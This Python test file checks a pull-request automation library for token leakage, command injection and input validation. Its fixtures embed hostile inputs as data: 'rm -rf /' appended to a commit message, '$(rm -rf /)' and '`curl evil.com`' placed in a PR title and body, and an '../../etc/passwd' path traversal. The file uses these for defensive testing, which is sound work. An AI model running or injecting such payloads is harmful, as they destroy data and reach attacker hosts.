# tests/security/test_pr_security.py
"""
Security tests for PR automation.

Focus areas:
- GITHUB_TOKEN not leaked in logs/output
- Command injection prevention
- Input validation
- Subprocess safety

Date: 2025-10-23
Workflow: 20251023_104242
Agent: test-master
"""

import os
import pytest
from unittest.mock import patch, Mock
from subprocess import CalledProcessError

try:
    from plugins.autonomous_dev.lib.pr_automation import (
        create_pull_request,
        parse_commit_messages_for_issues
    )
except ImportError as e:
    pytest.skip(f"Implementation not found (TDD red phase): {e}", allow_module_level=True)


class TestTokenSecurity:
    """Test GITHUB_TOKEN security - prevent token leakage."""

    @patch('subprocess.run')
    @patch.dict(os.environ, {'GITHUB_TOKEN': 'ghp_secret_token_value_12345'})
    def test_github_token_not_in_command_args(self, mock_run):
        """Test GITHUB_TOKEN not passed in command args (only in env)."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0, stdout='gh version 2.40.0'),
            Mock(returncode=0, stdout='Logged in'),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/1\n'),
        ]

        # Act
        result = create_pull_request()

        # Assert
        assert result['success'] is True

        # Verify token NEVER appears in command args
        for call in mock_run.call_args_list:
            call_str = str(call)
            assert 'ghp_secret_token_value_12345' not in call_str
            assert 'secret_token' not in call_str

    @patch('subprocess.run')
    @patch.dict(os.environ, {'GITHUB_TOKEN': 'ghp_test_token'})
    def test_github_token_not_in_error_messages(self, mock_run):
        """Test GITHUB_TOKEN not included in error messages."""
        # Arrange: Trigger rate limit error
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            CalledProcessError(
                returncode=1,
                cmd='gh pr create',
                stderr='GraphQL error: API rate limit exceeded for token ghp_***'
            ),
        ]

        # Act
        result = create_pull_request()

        # Assert
        assert result['success'] is False
        # Verify error message doesn't contain token
        assert 'ghp_test_token' not in result['error']
        assert 'rate limit' in result['error'].lower()

    @patch('subprocess.run')
    @patch.dict(os.environ, {'GITHUB_TOKEN': 'ghp_sensitive'})
    def test_github_token_passed_via_environment_only(self, mock_run):
        """Test GITHUB_TOKEN passed to subprocess via env, not args."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/1\n'),
        ]

        # Act
        create_pull_request()

        # Assert: Check gh pr create call specifically
        gh_pr_calls = [call for call in mock_run.call_args_list
                       if 'gh' in str(call) and 'pr' in str(call) and 'create' in str(call)]

        if gh_pr_calls:
            # If env is passed, it should be in kwargs, not in args list
            last_call = gh_pr_calls[-1]
            # Token should NOT be in command args
            assert 'ghp_sensitive' not in str(last_call[0])  # args tuple


class TestCommandInjection:
    """Test command injection prevention."""

    @patch('subprocess.run')
    def test_malicious_commit_message_not_executed(self, mock_run):
        """Test malicious shell commands in commit messages not executed."""
        # Arrange: Mock commit with command injection attempt
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(
                returncode=0,
                stdout='commit abc\n\n    feat: add feature\n\n    Closes #42; rm -rf /\n'  # Malicious!
            ),
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/1\n'),
        ]

        # Act
        result = create_pull_request()

        # Assert: subprocess.run should use list args, not shell=True
        for call in mock_run.call_args_list:
            # Verify shell=True not used (would enable command injection)
            if 'shell' in call.kwargs:
                assert call.kwargs['shell'] is False

            # Also verify args passed as list, not string
            if len(call.args) > 0 and call.args[0]:
                # First positional arg should be list for subprocess.run
                assert isinstance(call.args[0], (list, tuple)), \
                    "subprocess.run should use list args, not shell string"

    @patch('subprocess.run')
    def test_issue_number_validation_prevents_injection(self, mock_run):
        """Test only valid integer issue numbers extracted (no path traversal)."""
        # Arrange: Mock commit with malicious issue "number"
        mock_run.return_value = Mock(
            returncode=0,
            stdout=(
                'commit abc\n\n'
                '    feat: test\n\n'
                '    Closes #../../etc/passwd\n'  # Path traversal attempt
                '    Fixes #42\n'  # Valid issue
                '    Resolves #abc\n'  # Non-numeric
            )
        )

        # Act
        issue_numbers = parse_commit_messages_for_issues()

        # Assert: Only valid integers extracted
        assert issue_numbers == [42]
        assert all(isinstance(n, int) for n in issue_numbers)

        # Verify malicious strings NOT included
        for num in issue_numbers:
            assert '/' not in str(num)
            assert '.' not in str(num)

    @patch('subprocess.run')
    def test_special_characters_in_title_body_sanitized(self, mock_run):
        """Test special characters in title/body don't cause injection."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/1\n'),
        ]

        # Act: Try to inject shell commands via title/body
        result = create_pull_request(
            title='Test $(rm -rf /) Title',
            body='Test `curl evil.com` Body; ls -la'
        )

        # Assert: Should succeed (special chars escaped/sanitized)
        assert result['success'] is True

        # Verify shell=True not used
        for call in mock_run.call_args_list:
            if 'shell' in call.kwargs:
                assert call.kwargs['shell'] is False


class TestWorkflowSafety:
    """Test workflow safety mechanisms."""

    @patch('subprocess.run')
    def test_draft_pr_default_prevents_accidental_merge(self, mock_run):
        """Test default draft status prevents accidental auto-merge."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/1\n'),
        ]

        # Act: Create PR without specifying draft parameter
        result = create_pull_request()

        # Assert: Should default to draft
        assert result['draft'] is True

        # Verify --draft flag used in gh pr create
        gh_pr_call = str(mock_run.call_args_list[-1])
        assert '--draft' in gh_pr_call

    @patch('subprocess.run')
    def test_subprocess_timeout_prevents_hanging(self, mock_run):
        """Test subprocess timeout prevents infinite hangs."""
        from subprocess import TimeoutExpired

        # Arrange: Mock subprocess hanging
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            TimeoutExpired(cmd='gh pr create', timeout=30),  # Hangs for 30s then times out
        ]

        # Act
        result = create_pull_request()

        # Assert: Should handle timeout gracefully
        assert result['success'] is False
        assert 'timeout' in result['error'].lower()

        # Verify timeout parameter used in subprocess.run
        # (implementation should use timeout=30 or similar)


class TestInputValidation:
    """Test input validation and sanitization."""

    @patch('subprocess.run')
    def test_empty_title_body_handled(self, mock_run):
        """Test empty title/body handled gracefully."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            Mock(returncode=0, stdout='https://github.com/user/repo/pull/1\n'),
        ]

        # Act: Empty strings should fall back to --fill-verbose
        result = create_pull_request(title='', body='')

        # Assert: Should succeed (uses auto-fill)
        assert result['success'] is True

    @patch('subprocess.run')
    def test_invalid_reviewer_format_handled(self, mock_run):
        """Test invalid reviewer format handled gracefully."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            CalledProcessError(
                returncode=1,
                cmd='gh pr create',
                stderr='Error: invalid reviewer format'
            ),
        ]

        # Act: Pass invalid reviewer
        result = create_pull_request(reviewer='@@@invalid')

        # Assert: Should fail gracefully
        assert result['success'] is False
        assert 'error' in result

    @patch('subprocess.run')
    def test_nonexistent_base_branch_handled(self, mock_run):
        """Test nonexistent base branch handled gracefully."""
        # Arrange
        mock_run.side_effect = [
            Mock(returncode=0),
            Mock(returncode=0),
            Mock(returncode=0, stdout='* feature/test\n'),
            Mock(returncode=0, stdout='commit abc\n\n    test\n'),
            CalledProcessError(
                returncode=1,
                cmd='gh pr create',
                stderr='Error: base branch "nonexistent" not found'
            ),
        ]

        # Act
        result = create_pull_request(base='nonexistent')

        # Assert
        assert result['success'] is False
        assert 'error' in result
        assert 'branch' in result['error'].lower() or 'not found' in result['error'].lower()
